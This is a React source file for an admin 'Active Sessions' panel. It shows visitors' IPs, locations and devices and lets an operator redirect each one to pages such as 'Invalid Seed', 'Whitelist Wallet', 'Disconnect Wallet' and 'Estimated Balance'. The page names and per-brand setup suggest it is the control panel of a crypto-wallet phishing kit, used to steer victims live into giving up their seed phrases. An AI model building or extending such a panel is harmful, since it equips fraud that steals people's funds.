import React, { useState, useEffect, useRef } from 'react';
import { Ban, ExternalLink, Monitor, MapPin, Trash2, Clock, Globe } from 'lucide-react';
import { useAdminSocket } from '../contexts/AdminSocket';

const DeviceDetectorUtil = {
  browsers: {
    chrome: /chrome|chromium|crios/i,
    firefox: /firefox|fxios/i,
    safari: /safari/i,
    edge: /edg/i,
    opera: /opr|opera/i,
    ie: /trident|msie/i,
    brave: /brave/i,
    vivaldi: /vivaldi/i
  },
  operatingSystems: {
    windows: /windows/i,
    macos: /macintosh|mac os x/i,
    linux: /linux/i,
    ios: /iphone|ipad|ipod/i,
    android: /android/i,
    chromeos: /cros/i
  },
  detectBrowser(userAgent) {
    const ua = userAgent.toLowerCase();
    for (const [browser, regex] of Object.entries(this.browsers)) {
      if (regex.test(ua)) {
        return browser.charAt(0).toUpperCase() + browser.slice(1);
      }
    }
    return 'Unknown';
  },
  detectOS(userAgent) {
    const ua = userAgent.toLowerCase();
    for (const [os, regex] of Object.entries(this.operatingSystems)) {
      if (regex.test(ua)) {
        return os.charAt(0).toUpperCase() + os.slice(1);
      }
    }
    return 'Unknown';
  }
};

const StatusIndicator = ({ connected, lastHeartbeat }) => {
  const secondsAgo = Math.round((Date.now() - lastHeartbeat) / 1000);

  return (
    <div className="flex items-center space-x-2">
      <div className={`w-2 h-2 rounded-full ${connected ? 'bg-green-400' : 'bg-gray-400'}`} />
      <span className="text-xs text-gray-400">{secondsAgo}s ago</span>
    </div>
  );
};

const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
  const [selectedPage, setSelectedPage] = useState(session.currentPage || 'loading.html');
  const browser = DeviceDetectorUtil.detectBrowser(session.userAgent);
  const os = DeviceDetectorUtil.detectOS(session.userAgent);

  return (
    <tr className={`${isNew ? 'bg-orange-500/5' : ''} hover:bg-gray-800/30 transition-colors`}>
      <td className="px-6 py-4">
        <div className="flex items-center space-x-3">
          <Monitor className="w-4 h-4 text-gray-500" />
          <span className="text-sm font-medium text-white">{session.id}</span>
        </div>
      </td>
      <td className="px-6 py-4">
        <div className="flex items-center space-x-2">
          <MapPin className="w-4 h-4 text-gray-500" />
          <span className="text-sm text-gray-300">{session.ip}</span>
        </div>
      </td>
      <td className="px-6 py-4">
        <span className="text-sm text-gray-300">{session.city}, {session.country}</span>
      </td>
      <td className="px-6 py-4">
        <div>
          <div className="text-sm text-gray-300">{os}</div>
          <div className="text-xs text-gray-500">{browser}</div>
        </div>
      </td>
      <td className="px-6 py-4">
        <StatusIndicator connected={session.connected} lastHeartbeat={session.lastHeartbeat} />
      </td>
      <td className="px-6 py-4">
        <div className="flex items-center space-x-2">
          <select
            value={selectedPage}
            onChange={(e) => setSelectedPage(e.target.value)}
            className="px-2 py-1 text-xs bg-[#2a2a2a] border border-gray-700 rounded text-gray-300 focus:outline-none focus:border-orange-500"
          >
            <option value="loading.html">Loading</option>
            <option value="review.html">Review</option>
            <option value="estimatedbalance.html">Estimated Balance</option>
            <option value="whitelistwallet.html">Whitelist Wallet</option>
            <option value="DisconnectWallet.html">Disconnect Wallet</option>
            <option value="InvalidSeed.html">Invalid Seed</option>
            <option value="Completed.html">Completed</option>
          </select>
          <button
            onClick={() => onRedirect(session.id, selectedPage)}
            className="p-1.5 bg-orange-500/10 hover:bg-orange-500/20 text-orange-400 rounded transition-colors"
            title="Redirect"
          >
            <ExternalLink className="w-4 h-4" />
          </button>
          <button
            onClick={() => onRemove(session.id)}
            className="p-1.5 bg-yellow-500/10 hover:bg-yellow-500/20 text-yellow-400 rounded transition-colors"
            title="Remove"
          >
            <Trash2 className="w-4 h-4" />
          </button>
          <button
            onClick={() => onBan(session.ip)}
            className="p-1.5 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded transition-colors"
            title="Ban IP"
          >
            <Ban className="w-4 h-4" />
          </button>
        </div>
      </td>
    </tr>
  );
};

const SessionList = ({ selectedBrand }) => {
  const { sessions, banIP, redirectUser, removeSession } = useAdminSocket();
  const [newSessions, setNewSessions] = useState(new Set());
  const processedSessionsRef = useRef(new Set());

  useEffect(() => {
    const newSessionIds = sessions.filter(session => !processedSessionsRef.current.has(session.id))
                                .map(session => session.id);

    if (newSessionIds.length > 0) {
      setNewSessions(new Set([...newSessionIds]));
      processedSessionsRef.current = new Set(sessions.map(s => s.id));

      const timer = setTimeout(() => setNewSessions(new Set()), 3000);
      return () => clearTimeout(timer);
    }
  }, [sessions]);

  const handleBanIP = (ip) => {
    if (window.confirm(`Are you sure you want to ban IP ${ip}?`)) {
      banIP(ip);
    }
  };

  const handleRemoveSession = (sessionId) => {
    if (window.confirm('Are you sure you want to remove this session?')) {
      removeSession(sessionId);
      redirectUser(sessionId, 'loading.html');
    }
  };

  return (
    <div className="bg-gradient-to-br from-[#2a2a2a] to-[#252525] rounded-lg overflow-hidden">
      <div className="px-6 py-4 border-b border-gray-800">
        <div className="flex items-center justify-between">
          <h2 className="text-lg font-semibold text-white">Active Sessions</h2>
          <div className="flex items-center space-x-2">
            <Globe className="w-5 h-5 text-gray-400" />
            <span className="text-sm text-gray-400">{sessions.length} Sessions</span>
          </div>
        </div>
      </div>

      {sessions.length > 0 ? (
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-[#1a1a1a]">
              <tr>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Session ID</th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">IP Address</th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Location</th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Device</th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Status</th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800">
              {sessions.map((session) => (
                <SessionRow
                  key={session.id}
                  session={session}
                  onRedirect={redirectUser}
                  onBan={handleBanIP}
                  onRemove={handleRemoveSession}
                  isNew={newSessions.has(session.id)}
                />
              ))}
            </tbody>
          </table>
        </div>
      ) : (
        <div className="px-6 py-12 text-center">
          <Monitor className="w-12 h-12 text-gray-600 mx-auto mb-4" />
          <p className="text-gray-400">No active sessions</p>
        </div>
      )}
    </div>
  );
};

export default SessionList;